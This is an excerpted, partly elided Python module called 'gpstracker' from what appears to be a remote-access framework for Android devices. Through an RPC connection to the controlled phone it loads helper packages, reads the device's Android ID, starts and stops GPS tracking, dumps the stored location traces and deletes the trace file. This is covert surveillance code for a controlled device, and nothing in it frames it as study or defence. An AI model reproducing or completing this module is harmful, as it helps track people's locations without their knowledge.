...
from ghost.network.lib.rpc.utils.classic import download
from ghost.ghostlib.utils.common import getLocalAndroidPath
...
class gpstracker(GhostModule):
    """ to interact with gps """

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = GhostArgumentParser(prog='gpstracker', description=cls.__doc__)
    ...
    def run(self, args):
        self.client.load_package("ghostdroid.gpsTracker")
        self.client.load_package("ghostdroid.utils")
        androidID = self.client.conn.modules['ghostdroid.utils'].getAndroidID()
        ...
        gpsTracker = self.client.conn.modules['ghostdroid.gpsTracker'].GpsTracker(period=args.period, inMemory=args.in_memory)
        ...
        if args.get_position:
            ...
            gpsTracker.disable()
        if args.start:
            if self.client.conn.modules["ghostdroid.gpsTracker"].startGpsTracker(period=args.period):
            ...
            if self.client.conn.modules["ghostdroid.gpsTracker"].stopGpsTracker():
            ...
            if not args.in_memory:
                ...
                traces = self.client.conn.modules["ghostdroid.gpsTracker"].dumpGpsTracker()
            ...
            if self.client.conn.modules["ghostdroid.gpsTracker"].statusGpsTracker():
                self.success("GPS tracking is enabled")
            else:
                self.success("GPS tracking is NOT enabled")
        elif args.clean:
            status = self.client.conn.modules["ghostdroid.gpsTracker"].deleteFile()
            if status:
